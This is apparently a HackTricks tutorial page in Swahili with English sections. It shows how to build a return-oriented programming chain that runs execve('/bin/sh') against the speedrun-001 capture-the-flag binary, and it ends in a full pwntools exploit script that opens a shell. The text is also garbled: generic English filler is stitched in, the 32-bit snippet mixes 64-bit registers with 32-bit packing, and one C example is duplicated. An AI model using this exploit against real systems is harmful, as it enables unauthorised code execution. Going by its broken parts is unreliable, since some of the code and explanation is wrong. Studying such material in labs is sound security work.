# ROP - piga simu kwa sys\_execve

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Ili kuandaa wito wa **syscall**, inahitajika mipangilio ifuatayo:

* `rax: 59 Weka sys_execve`
* `rdi: ptr kwa "/bin/sh" weka faili ya kutekelezwa`
* `rsi: 0 weka hakuna hoja zilizopitishwa`
* `rdx: 0 weka hakuna mazingira ya mazingira yaliyopitishwa`

Kwa hivyo, kimsingi inahitajika kuandika herufi "/bin/sh" mahali fulani na kisha kufanya `syscall` (ukiwa na ufahamu wa kujaza kwenye stack).

## Dhibiti rejista

Hebu tuanze kwa kujua **jinsi ya kudhibiti rejista hizo**:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Kwa anwani hizi, ni **inawezekana kuandika maudhui kwenye stack na kuyapakia kwenye rejista**.

## Andika herufi

### Kumbukumbu inayoweza kuandikwa

Kwanza unahitaji kupata mahali pa kuandika kwenye kumbukumbu.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Andika Nakala

Kisha unahitaji kupata njia ya kuandika maudhui yoyote katika anwani hii
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 bits

##### ROP (Return Oriented Programming) - Syscall - execv

ROP (Return Oriented Programming) is a technique used in exploitation to bypass security measures like DEP (Data Execution Prevention) and ASLR (Address Space Layout Randomization). It involves chaining together small snippets of code called gadgets to perform malicious actions.

In this case, we will use ROP to execute the `execv` syscall in a 32-bit Linux environment. The `execv` syscall is used to execute a program with command-line arguments.

To accomplish this, we need to find the addresses of the necessary gadgets and the address of the `execv` function in the target binary. We can use tools like `ROPgadget` and `objdump` to assist us in this process.

Once we have the addresses, we can construct our ROP chain by placing the addresses of the gadgets and the arguments for the `execv` syscall in the correct order on the stack. Finally, we trigger the ROP chain by overwriting the return address of a vulnerable function with the address of the first gadget.

By carefully selecting gadgets and constructing the ROP chain, we can achieve arbitrary code execution and execute the `execv` syscall with our desired program and arguments.

It is important to note that ROP techniques are highly dependent on the specific target binary and system configuration. Therefore, thorough analysis and testing are necessary to ensure successful exploitation.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 biti

##### ROP (Return Oriented Programming) - Syscall - execv

###### Introduction

In this section, we will explore a technique called Return Oriented Programming (ROP) to perform a syscall using the `execv` function. This technique is applicable to 64-bit systems.

###### Prerequisites

Before we begin, make sure you have a basic understanding of ROP and how syscalls work.

###### Steps

1. Find the address of the `execv` function in the target binary. You can use tools like `objdump` or `readelf` to accomplish this.

2. Identify gadgets in the binary that can be used to construct a ROP chain. Gadgets are small pieces of code that end with a `ret` instruction.

3. Build the ROP chain by chaining together gadgets that perform the necessary operations to set up the `execv` syscall. This may involve setting up the necessary registers with the correct values.

4. Craft a payload that overflows a buffer and redirects the program's execution to the ROP chain.

5. Execute the payload and observe the `execv` syscall being performed.

###### Example

Let's walk through a simple example to illustrate the process.

Assume we have a vulnerable program that reads user input into a buffer without proper bounds checking. We want to exploit this vulnerability to execute the `execv` syscall and run a shell command.

1. Find the address of the `execv` function in the binary.

2. Identify gadgets that can be used to set up the necessary registers for the `execv` syscall.

3. Build the ROP chain by chaining together these gadgets.

4. Craft a payload that overflows the buffer and redirects the program's execution to the ROP chain.

5. Execute the payload and observe the `execv` syscall being performed.

###### Conclusion

ROP combined with syscalls can be a powerful technique for exploiting vulnerabilities in 64-bit systems. By carefully constructing a ROP chain, it is possible to perform arbitrary operations using syscalls, such as executing shell commands.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Mfano

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", "-c", "echo Hello, World!", NULL};
    execv("/bin/sh", args);
    return 0;
}
```

## Mfano

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", "-c", "echo Hello, World!", NULL};
    execv("/bin/sh", args);
    return 0;
}
```
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Marejeo

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
